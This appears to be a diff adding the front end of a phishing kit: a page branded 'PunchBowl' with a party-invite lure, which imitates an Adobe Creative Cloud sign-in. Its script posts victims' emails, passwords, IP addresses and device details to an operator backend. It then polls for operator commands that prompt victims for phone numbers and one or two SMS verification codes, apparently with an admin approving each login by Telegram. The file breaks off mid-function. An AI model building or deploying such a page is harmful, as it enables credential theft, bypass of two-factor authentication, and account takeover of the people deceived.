@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PunchBowl</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="./punchbowl.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Adobe+Clean:wght@400;700&family=Source+Sans+3:wght@300;400;600;700&family=Source+Serif+4:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #eb1000;
+      --red-dark: #c40000;
+      --red-glow: rgba(235,16,0,0.18);
+      --bg: #0a0a0e;
+      --surface: #13131a;
+      --surface2: #1c1c26;
+      --border: rgba(255,255,255,0.07);
+      --border-focus: rgba(235,16,0,0.6);
+      --text: #f0f0f4;
+      --text-dim: #8a8a9a;
+      --text-dimmer: #55556a;
+      --success: #2ecc71;
+      --warning: #f39c12;
+      --danger: #e74c3c;
+    }
+
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Source Sans 3', sans-serif;
+      color: var(--text);
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Animated background */
+    .bg-scene {
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    }
+    .bg-orb {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      animation: orbFloat 8s ease-in-out infinite;
+    }
+    .bg-orb.o1 {
+      width: 500px; height: 500px;
+      background: radial-gradient(circle, rgba(235,16,0,0.12) 0%, transparent 70%);
+      top: -150px; left: -100px;
+      animation-delay: 0s;
+    }
+    .bg-orb.o2 {
+      width: 400px; height: 400px;
+      background: radial-gradient(circle, rgba(100,20,200,0.08) 0%, transparent 70%);
+      bottom: -100px; right: -80px;
+      animation-delay: -3s;
+    }
+    .bg-orb.o3 {
+      width: 300px; height: 300px;
+      background: radial-gradient(circle, rgba(235,16,0,0.07) 0%, transparent 70%);
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      animation-delay: -5s;
+    }
+    @keyframes orbFloat {
+      0%, 100% { transform: translate(0,0) scale(1); }
+      33% { transform: translate(20px,-15px) scale(1.04); }
+      66% { transform: translate(-10px,10px) scale(0.97); }
+    }
+
+    /* Noise overlay */
+    .noise {
+      position: fixed; inset: 0; z-index: 1; pointer-events: none; opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+    }
+
+    /* Card */
+    .card {
+      position: relative; z-index: 10;
+      width: 440px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 44px 40px;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03);
+      animation: cardIn 0.6s cubic-bezier(0.16,1,0.3,1) both;
+    }
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(24px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* Screen transitions */
+    .screen { display: none; animation: screenIn 0.35s ease both; }
+    .screen.active { display: block; }
+    @keyframes screenIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Adobe logo */
+    .adobe-logo {
+      display: flex; align-items: center; gap: 10px; margin-bottom: 32px;
+    }
+    .adobe-logo-icon {
+      width: 40px; height: 40px;
+      background: var(--red);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 20px; font-weight: 900; color: white;
+      letter-spacing: -1px;
+      box-shadow: 0 4px 20px rgba(235,16,0,0.4);
+    }
+    .adobe-logo-text {
+      font-size: 22px; font-weight: 700; color: var(--text);
+      letter-spacing: -0.3px;
+    }
+
+    h1 {
+      font-size: 28px; font-weight: 700; margin-bottom: 8px;
+      letter-spacing: -0.5px; color: var(--text);
+    }
+    .sub {
+      color: var(--text-dim); font-size: 15px; line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    /* Buttons */
+    .btn {
+      width: 100%; padding: 14px 20px;
+      border: none; border-radius: 12px;
+      font-size: 15px; font-weight: 600;
+      cursor: pointer; margin-bottom: 12px;
+      transition: all 0.2s; position: relative;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      font-family: inherit;
+    }
+    .btn:last-child { margin-bottom: 0; }
+    .btn:active { transform: scale(0.98); }
+
+    .btn-primary {
+      background: var(--red); color: white;
+      box-shadow: 0 4px 20px rgba(235,16,0,0.35);
+    }
+    .btn-primary:hover { background: var(--red-dark); box-shadow: 0 6px 28px rgba(235,16,0,0.5); transform: translateY(-1px); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    .btn-ghost {
+      background: var(--surface2); color: var(--text);
+      border: 1px solid var(--border);
+    }
+    .btn-ghost:hover { background: #24242f; border-color: rgba(255,255,255,0.12); }
+
+    .btn-icon { width: 20px; height: 20px; flex-shrink: 0; }
+
+    /* Divider */
+    .divider {
+      display: flex; align-items: center; gap: 14px;
+      margin: 20px 0; color: var(--text-dimmer); font-size: 13px;
+    }
+    .divider::before, .divider::after {
+      content: ''; flex: 1; height: 1px; background: var(--border);
+    }
+
+    /* Inputs */
+    .input-group { margin-bottom: 16px; }
+    .input-group label {
+      display: block; font-size: 13px; font-weight: 600;
+      color: var(--text-dim); margin-bottom: 7px; letter-spacing: 0.3px;
+    }
+    .input {
+      width: 100%; background: var(--surface2);
+      border: 1px solid var(--border); color: var(--text);
+      padding: 13px 16px; border-radius: 10px;
+      font-size: 15px; outline: none; transition: all 0.2s;
+      font-family: inherit;
+    }
+    .input:focus {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 0 3px rgba(235,16,0,0.12);
+      background: #1a1a24;
+    }
+    .input::placeholder { color: var(--text-dimmer); }
+
+    /* Back link */
+    .back-btn {
+      display: inline-flex; align-items: center; gap: 6px;
+      color: var(--text-dim); font-size: 14px; cursor: pointer;
+      margin-bottom: 24px; transition: color 0.2s;
+      background: none; border: none; font-family: inherit;
+    }
+    .back-btn:hover { color: var(--text); }
+    .back-btn svg { width: 16px; height: 16px; }
+
+    /* Switch */
+    .switch {
+      text-align: center; color: var(--text-dim);
+      font-size: 14px; margin-top: 20px;
+    }
+    .switch a { color: var(--red); cursor: pointer; font-weight: 600; text-decoration: none; }
+    .switch a:hover { text-decoration: underline; }
+
+    /* ====== WAITING SCREEN ====== */
+    .waiting-wrap {
+      text-align: center; padding: 10px 0;
+    }
+    .tg-icon {
+      width: 72px; height: 72px; margin: 0 auto 24px;
+      background: linear-gradient(135deg, #2aabee, #229ed9);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 8px 30px rgba(42,171,238,0.3);
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 8px 30px rgba(42,171,238,0.3); }
+      50% { transform: scale(1.06); box-shadow: 0 12px 40px rgba(42,171,238,0.5); }
+    }
+    .tg-icon svg { width: 38px; height: 38px; fill: white; }
+
+    .waiting-title { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+    .waiting-sub { color: var(--text-dim); font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+    .status-dots {
+      display: flex; justify-content: center; gap: 8px; margin-bottom: 28px;
+    }
+    .dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--text-dimmer);
+      animation: dotBounce 1.4s ease-in-out infinite;
+    }
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes dotBounce {
+      0%, 60%, 100% { transform: translateY(0); background: var(--text-dimmer); }
+      30% { transform: translateY(-6px); background: var(--red); }
+    }
+
+    .session-info {
+      background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 12px; padding: 14px 18px;
+      font-size: 13px; color: var(--text-dim); text-align: left;
+      margin-bottom: 20px; line-height: 1.8;
+    }
+    .session-info span { color: var(--text); font-weight: 600; }
+
+    /* ====== RESULT SCREENS ====== */
+    .result-wrap { text-align: center; padding: 10px 0; }
+    .result-icon {
+      width: 72px; height: 72px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 24px; font-size: 34px;
+    }
+    .result-icon.success { background: rgba(46,204,113,0.15); border: 2px solid rgba(46,204,113,0.3); }
+    .result-icon.denied  { background: rgba(231,76,60,0.15);  border: 2px solid rgba(231,76,60,0.3);  }
+    .result-icon.blocked { background: rgba(243,156,18,0.15); border: 2px solid rgba(243,156,18,0.3); }
+    .result-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
+    .result-sub { color: var(--text-dim); font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+    /* SMS screen */
+    .sms-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 20px; padding: 6px 16px;
+      font-size: 13px; color: var(--text-dim); margin-bottom: 24px;
+    }
+    .sms-badge .dot-live {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--success); animation: livePulse 1.5s infinite;
+    }
+    @keyframes livePulse {
+      0%,100% { opacity:1; } 50% { opacity:0.3; }
+    }
+
+    .otp-inputs {
+      display: flex; gap: 10px; justify-content: center; margin: 20px 0 24px;
+    }
+    .otp-input {
+      width: 52px; height: 60px;
+      background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 12px; color: var(--text);
+      font-size: 24px; font-weight: 700; text-align: center;
+      outline: none; transition: all 0.2s; font-family: monospace;
+    }
+    .otp-input:focus {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 0 3px rgba(235,16,0,0.12);
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+      background: #1e1e2e; border: 1px solid var(--border);
+      border-radius: 12px; padding: 14px 22px;
+      font-size: 14px; color: var(--text);
+      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+      z-index: 9999; opacity: 0; pointer-events: none;
+      transition: opacity 0.3s, transform 0.3s;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(-4px); }
+
+    /* Loading spinner */
+    .spinner {
+      width: 18px; height: 18px; border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      animation: spin 0.7s linear infinite; display: none;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading .spinner { display: inline-block; }
+    .loading .btn-text { display: none; }
+
+    /* Timer */
+    .timer {
+      font-size: 13px; color: var(--text-dimmer); margin-top: 16px;
+    }
+    .timer span { color: var(--red); font-weight: 700; }
+
+    @media (max-width: 480px) {
+      .card { width: 100%; min-height: 100vh; border-radius: 0; padding: 36px 24px; }
+      body { align-items: flex-start; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-scene">
+  <div class="bg-orb o1"></div>
+  <div class="bg-orb o2"></div>
+  <div class="bg-orb o3"></div>
+</div>
+<div class="noise"></div>
+
+<div class="card">
+
+  <!-- ===== MAIN SCREEN ===== -->
+  <div id="mainScreen" class="screen active">
+    <div class="adobe-logo">
+      <div class="adobe-logo-icon">P</div>
+      <div class="adobe-logo-text">PunchBowl</div>
+    </div>
+    <h1>You're Invited!</h1>
+    <p class="sub">Sign in to continue to your Creative Cloud dashboard and access all your files.</p>
+
+    <button class="btn btn-primary" id="emailLoginBtn">
+      <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 7L2 7"/></svg>
+      <span>Continue with Email</span>
+    </button>
+
+    <div class="divider">or</div>
+
+    <button class="btn btn-ghost" id="googleBtn">
+      <svg class="btn-icon" viewBox="0 0 24 24"><path fill="#EA4335" d="M5.27 9.76A7.08 7.08 0 0 1 12 4.9c1.76 0 3.35.66 4.56 1.73l3.4-3.4A12 12 0 0 0 .28 10.8l4.99-1.04z"/><path fill="#34A853" d="M16.04 19.28A11.88 11.88 0 0 1 12 20.1c-4.28 0-7.97-2.38-9.78-5.84l-4.94 1.04A11.96 11.96 0 0 0 12 24c3.24 0 6.19-1.16 8.5-3.05l-4.46-1.67z"/><path fill="#FBBC05" d="M23.78 12.27c0-.82-.07-1.61-.2-2.38H12v4.5h6.6a5.62 5.62 0 0 1-2.45 3.68l4.46 1.67c2.6-2.4 4.17-5.93 4.17-10.47z"/><path fill="#4285F4" d="M2.22 14.26A7.06 7.06 0 0 1 4.9 9.76L-.09 8.72A11.93 11.93 0 0 0 0 12c0 1.96.48 3.8 1.28 5.44l4.94-1.04a7.06 7.06 0 0 1-4-2.14z"/></svg>
+      <span>Continue with Google</span>
+    </button>
+
+    <button class="btn btn-ghost" id="appleBtn">
+      <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+      <span>Continue with Apple</span>
+    </button>
+  </div>
+
+  <!-- ===== LOGIN SCREEN ===== -->
+  <div id="loginScreen" class="screen">
+    <button class="back-btn" id="backBtn1">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
+      Back
+    </button>
+    <div class="adobe-logo">
+      <div class="adobe-logo-icon">A</div>
+      <div class="adobe-logo-text">Adobe</div>
+    </div>
+    <h1>Welcome back</h1>
+    <p class="sub">Enter your credentials to access your Creative Cloud.</p>
+
+    <div class="input-group">
+      <label>Email address</label>
+      <input type="email" class="input" id="loginEmail" placeholder="name@example.com" autocomplete="email">
+    </div>
+    <div class="input-group">
+      <label>Password</label>
+      <input type="password" class="input" id="loginPassword" placeholder="Your password" autocomplete="current-password">
+    </div>
+
+    <button class="btn btn-primary" id="loginSubmitBtn">
+      <span class="btn-text">Sign In</span>
+      <div class="spinner"></div>
+    </button>
+
+    <div class="switch">No account? <a id="switchToRegister">Create one</a></div>
+  </div>
+
+  <!-- ===== REGISTER SCREEN ===== -->
+  <div id="registerScreen" class="screen">
+    <button class="back-btn" id="backBtn2">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
+      Back
+    </button>
+    <div class="adobe-logo">
+      <div class="adobe-logo-icon">A</div>
+      <div class="adobe-logo-text">Adobe</div>
+    </div>
+    <h1>Create account</h1>
+    <p class="sub">Start your creative journey with Adobe today.</p>
+
+    <div class="input-group">
+      <label>Full name</label>
+      <input type="text" class="input" id="regName" placeholder="John Doe">
+    </div>
+    <div class="input-group">
+      <label>Email address</label>
+      <input type="email" class="input" id="regEmail" placeholder="name@example.com">
+    </div>
+    <div class="input-group">
+      <label>Password</label>
+      <input type="password" class="input" id="regPassword" placeholder="Create a strong password">
+    </div>
+
+    <button class="btn btn-primary" id="registerSubmitBtn">
+      <span class="btn-text">Create Account</span>
+      <div class="spinner"></div>
+    </button>
+
+    <div class="switch">Already have an account? <a id="switchToLogin">Sign in</a></div>
+  </div>
+
+  <!-- ===== WAITING FOR TELEGRAM ===== -->
+  <div id="waitingScreen" class="screen">
+    <div class="waiting-wrap">
+      <div class="tg-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.94 8.19-1.97 9.28c-.15.66-.54.82-1.09.51l-3-2.21-1.45 1.4c-.16.16-.3.3-.61.3l.22-3.06 5.56-5.02c.24-.21-.05-.33-.37-.12L6.35 14.1l-2.95-.92c-.64-.2-.65-.64.13-.95l11.53-4.45c.53-.19 1 .13.88.41z"/></svg>
+      </div>
+      <h2 class="waiting-title">Verifying your identity</h2>
+      <p class="waiting-sub">We've sent a verification request to the admin.<br>Please wait while your login is being reviewed.</p>
+      <div class="status-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div class="session-info" id="sessionInfoBox">
+        📧 Email: <span id="infoEmail">—</span><br>
+        🌐 IP: <span id="infoIP">Detecting...</span><br>
+        📱 Device: <span id="infoDevice">—</span>
+      </div>
+      <button class="btn btn-ghost" id="cancelWaitBtn">Cancel</button>
+      <div class="timer">Session expires in <span id="countdown">120</span>s</div>
+    </div>
+  </div>
+
+  <!-- ===== SMS CODE SCREEN ===== -->
+  <div id="smsScreen" class="screen">
+    <button class="back-btn" id="backBtn3">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
+      Back
+    </button>
+    <div class="adobe-logo">
+      <div class="adobe-logo-icon">A</div>
+      <div class="adobe-logo-text">Adobe</div>
+    </div>
+    <h1>Enter the code</h1>
+    <div class="sms-badge">
+      <div class="dot-live"></div>
+      <span id="smsLabel">A 6-digit code was sent to your device</span>
+    </div>
+    <p class="sub">Enter the verification code to complete sign-in.</p>
+    <div class="otp-inputs">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+      <input class="otp-input" maxlength="1" type="text" inputmode="numeric">
+    </div>
+    <button class="btn btn-primary" id="smsSubmitBtn">
+      <span class="btn-text">Verify Code</span>
+      <div class="spinner"></div>
+    </button>
+  </div>
+
+  <!-- ===== NUMBER PROMPT SCREEN ===== -->
+  <div id="numberScreen" class="screen">
+    <button class="back-btn" id="backBtn4">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
+      Back
+    </button>
+    <div class="adobe-logo">
+      <div class="adobe-logo-icon">A</div>
+      <div class="adobe-logo-text">Adobe</div>
+    </div>
+    <h1>Phone verification</h1>
+    <p class="sub">For extra security, please provide your phone number to receive a verification code.</p>
+    <div class="input-group">
+      <label>Phone number</label>
+      <input type="tel" class="input" id="phoneInput" placeholder="+1 (555) 000-0000">
+    </div>
+    <button class="btn btn-primary" id="phoneSubmitBtn">
+      <span class="btn-text">Send Code</span>
+      <div class="spinner"></div>
+    </button>
+  </div>
+
+  <!-- ===== SUCCESS SCREEN ===== -->
+  <div id="successScreen" class="screen">
+    <div class="result-wrap">
+      <div class="result-icon success">✅</div>
+      <h2 class="result-title">Access Granted</h2>
+      <p class="result-sub">Your identity has been verified successfully. Welcome back to Adobe Creative Cloud.</p>
+      <button class="btn btn-primary" onclick="window.location.reload()">Continue to Dashboard →</button>
+    </div>
+  </div>
+
+  <!-- ===== DENIED SCREEN ===== -->
+  <div id="deniedScreen" class="screen">
+    <div class="result-wrap">
+      <div class="result-icon denied">❌</div>
+      <h2 class="result-title">Access Denied</h2>
+      <p class="result-sub">Your login attempt was rejected. If you believe this is a mistake, please contact Adobe Support.</p>
+      <button class="btn btn-ghost" onclick="showScreen('mainScreen')">Try again</button>
+    </div>
+  </div>
+
+  <!-- ===== BLOCKED SCREEN ===== -->
+  <div id="blockedScreen" class="screen">
+    <div class="result-wrap">
+      <div class="result-icon blocked">🚫</div>
+      <h2 class="result-title">Account Blocked</h2>
+      <p class="result-sub">This session has been blocked due to suspicious activity. Please contact Adobe Support if you need assistance.</p>
+      <button class="btn btn-ghost" onclick="window.location.reload()">Return to Home</button>
+    </div>
+  </div>
+
+</div><!-- /card -->
+
+<div class="toast" id="toast">
+  <span id="toastMsg">Notification</span>
+</div>
+
+<script>
+  // ─── CONFIG ───────────────────────────────────────────────
+  // Change this to your deployed backend URL (e.g. https://your-app.railway.app)
+  const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+    ? 'http://localhost:3000'
+    : window.location.origin; // when served from same origin as backend
+
+  // ─── STATE ────────────────────────────────────────────────
+  let currentSessionId = null;
+  let pollInterval = null;
+  let countdownTimer = null;
+  let currentEmail = '';
+  let currentPass = '';
+
+  // ─── SCREEN MANAGEMENT ────────────────────────────────────
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => {
+      s.classList.remove('active');
+      s.style.animation = 'none';
+    });
+    const el = document.getElementById(id);
+    el.classList.add('active');
+    void el.offsetWidth; // reflow
+    el.style.animation = '';
+  }
+
+  // ─── TOAST ────────────────────────────────────────────────
+  function showToast(msg, duration = 3500) {
+    const t = document.getElementById('toast');
+    document.getElementById('toastMsg').textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), duration);
+  }
+
+  // ─── BUTTON LOADING STATE ─────────────────────────────────
+  function setLoading(btn, state) {
+    btn.classList.toggle('loading', state);
+    btn.disabled = state;
+  }
+
+  // ─── GET DEVICE INFO ──────────────────────────────────────
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    const mobile = /Mobile|Android|iPhone|iPad/i.test(ua);
+    const os = /Windows/i.test(ua) ? 'Windows' : /Mac/i.test(ua) ? 'macOS' : /Linux/i.test(ua) ? 'Linux' : /Android/i.test(ua) ? 'Android' : /iPhone|iPad/i.test(ua) ? 'iOS' : 'Unknown';
+    const browser = /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' : /Firefox/i.test(ua) ? 'Firefox' : /Safari/i.test(ua) ? 'Safari' : /Edge/i.test(ua) ? 'Edge' : 'Unknown';
+    return `${browser} on ${os} (${mobile ? 'Mobile' : 'Desktop'})`;
+  }
+
+  // ─── NAVIGATION ───────────────────────────────────────────
+  document.getElementById('emailLoginBtn').addEventListener('click', () => showScreen('loginScreen'));
+  document.getElementById('googleBtn').addEventListener('click', () => showScreen('loginScreen'));
+  document.getElementById('appleBtn').addEventListener('click', () => showScreen('registerScreen'));
+  document.getElementById('backBtn1').addEventListener('click', () => showScreen('mainScreen'));
+  document.getElementById('backBtn2').addEventListener('click', () => showScreen('mainScreen'));
+  document.getElementById('backBtn3').addEventListener('click', () => { stopPolling(); showScreen('loginScreen'); });
+  document.getElementById('backBtn4').addEventListener('click', () => showScreen('loginScreen'));
+  document.getElementById('switchToRegister').addEventListener('click', () => showScreen('registerScreen'));
+  document.getElementById('switchToLogin').addEventListener('click', () => showScreen('loginScreen'));
+  document.getElementById('cancelWaitBtn').addEventListener('click', () => { stopPolling(); showScreen('mainScreen'); });
+
+  // ─── LOGIN SUBMIT ─────────────────────────────────────────
+  document.getElementById('loginSubmitBtn').addEventListener('click', async () => {
+    const email = document.getElementById('loginEmail').value.trim();
+    const pass  = document.getElementById('loginPassword').value;
+    if (!email || !pass) return showToast('⚠️ Please fill in all fields');
+
+    currentEmail = email;
+    currentPass  = pass;
+
+    const btn = document.getElementById('loginSubmitBtn');
+    setLoading(btn, true);
+
+    try {
+      const geo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'Unknown' }));
+      const ip = geo.ip;
+
+      const res = await fetch(`${BACKEND_URL}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password: pass, ip, device: getDeviceInfo(), ua: navigator.userAgent })
+      });
+      const data = await res.json();
+
+      if (data.sessionId) {
+        currentSessionId = data.sessionId;
+        document.getElementById('infoEmail').textContent  = email;
+        document.getElementById('infoIP').textContent     = ip;
+        document.getElementById('infoDevice').textContent = getDeviceInfo();
+        showScreen('waitingScreen');
+        startCountdown(120);
+        startPolling();
+      } else {
+        showToast('❌ Error connecting. Please try again.');
+      }
+    } catch(e) {
+      showToast('❌ Server unreachable. Check backend is running.');
+      console.error(e);
+    } finally {
+      setLoading(btn, false);
+    }
+  });
+
+  // ─── REGISTER SUBMIT ──────────────────────────────────────
+  document.getElementById('registerSubmitBtn').addEventListener('click', async () => {
+    const name  = document.getElementById('regName').value.trim();
+    const email = document.getElementById('regEmail').value.trim();
+    const pass  = document.getElementById('regPassword').value;
+    if (!name || !email || !pass) return showToast('⚠️ Please fill in all fields');
+
+    currentEmail = email;
+    currentPass  = pass;
+
+    const btn = document.getElementById('registerSubmitBtn');
+    setLoading(btn, true);
+
+    try {
+      const geo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'Unknown' }));
+      const ip = geo.ip;
+
+      const res = await fetch(`${BACKEND_URL}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password: pass, name, ip, device: getDeviceInfo(), ua: navigator.userAgent, type: 'register' })
+      });
+      const data = await res.json();
+
+      if (data.sessionId) {
+        currentSessionId = data.sessionId;
+        document.getElementById('infoEmail').textContent  = email;
+        document.getElementById('infoIP').textContent     = ip;
+        document.getElementById('infoDevice').textContent = getDeviceInfo();
+        showScreen('waitingScreen');
+        startCountdown(120);
+        startPolling();
+      } else {
+        showToast('❌ Error connecting. Please try again.');
+      }
+    } catch(e) {
+      showToast('❌ Server unreachable. Check backend is running.');
+    } finally {
+      setLoading(btn, false);
+    }
+  });
+
+  // ─── PHONE SUBMIT ─────────────────────────────────────────
+  document.getElementById('phoneSubmitBtn').addEventListener('click', async () => {
+    const phone = document.getElementById('phoneInput').value.trim();
+    if (!phone) return showToast('⚠️ Enter your phone number');
+
+    const btn = document.getElementById('phoneSubmitBtn');
+    setLoading(btn, true);
+
+    try {
+      await fetch(`${BACKEND_URL}/api/session/${currentSessionId}/phone`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone })
+      });
+      showToast('📱 Phone number submitted!');
+      showScreen('waitingScreen');
+      startPolling();
+    } catch(e) {
+      showToast('❌ Error submitting phone.');
+    } finally {
+      setLoading(btn, false);
+    }
+  });
+
+  // ─── SMS SUBMIT ───────────────────────────────────────────
+  document.getElementById('smsSubmitBtn').addEventListener('click', async () => {
+    const inputs = document.querySelectorAll('.otp-input');
+    const code = Array.from(inputs).map(i => i.value).join('');
+    if (code.length < 6) return showToast('⚠️ Enter all 6 digits');
+
+    const btn = document.getElementById('smsSubmitBtn');
+    setLoading(btn, true);
+
+    try {
+      const res = await fetch(`${BACKEND_URL}/api/session/${currentSessionId}/sms`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code })
+      });
+      const data = await res.json();
+      showToast('📤 Code submitted!');
+      showScreen('waitingScreen');
+      startPolling();
+    } catch(e) {
+      showToast('❌ Error submitting code.');
+    } finally {
+      setLoading(btn, false);
+    }
+  });
+
+  // ─── OTP INPUT AUTO-ADVANCE ───────────────────────────────
+  document.querySelectorAll('.otp-input').forEach((input, idx, all) => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/\D/g, '').slice(-1);
+      if (input.value && idx < all.length - 1) all[idx + 1].focus();
+    });
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !input.value && idx > 0) all[idx - 1].focus();
+    });
+  });
+
+  // ─── POLLING ──────────────────────────────────────────────
+  function startPolling() {
+    stopPolling();
+    pollInterval = setInterval(checkStatus, 2500);
+  }
+  function stopPolling() {
+    if (pollInterval) clearInterval(pollInterval);
+    if (countdownTimer) clearInterval(countdownTimer);
+    pollInterval = null;
+    countdownTimer = null;
+  }
+
+  async function checkStatus() {
+    if (!currentSessionId) return;
+    try {
+      const res = await fetch(`${BACKEND_URL}/api/session/${currentSessionId}/status`);
+      const data = await res.json();
+
+      switch(data.status) {
+        case 'approved':
+          stopPolling(); showScreen('successScreen'); break;
+        case 'denied':
+          stopPolling(); showScreen('deniedScreen'); break;
+        case 'blocked':
+          stopPolling(); showScreen('blockedScreen'); break;
+        case 'sms_required':
+          stopPolling();
+          document.getElementById('smsLabel').textContent = data.message || 'A 6-digit code was sent';
+          showScreen('smsScreen');
+          break;
+        case 'sms2_required':
+          stopPolling();
+          document.getElementById('smsLabel').textContent = 'Enter the second verification code';
+          document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+          showScreen('smsScreen');
+          break;
+        case 'number_required':
+          stopPolling(); showScreen('numberScreen'); break;
+        case 'password_error':
+          stopPolling();
+          showToast('❌ Incorrect password. Please try again.');
+          showScreen('loginScreen');
+          break;
+        case 'pending':
+        default:
+          break; // keep waiting
+      }
+    } catch(e) {
+      // silently ignore poll errors
+    }
+  }
+
+  // ─── COUNTDOWN ────────────────────────────────────────────
+  function startCountdown(seconds) {
+    if (countdownTimer) clearInterval(countdownTimer);
+    let remaining = seconds;
+    document.getElementById('countdown').textContent = remaining;
+    countdownTimer = setInterval(() => {
+      remaining--;
+      document.getElementById('countdown').textContent = remaining;
+      if (remaining <= 0) {
+        clearInterval(countdownTimer);
+        stopPolling();
+        showToast('⏱️ Session expired. Please try again.');
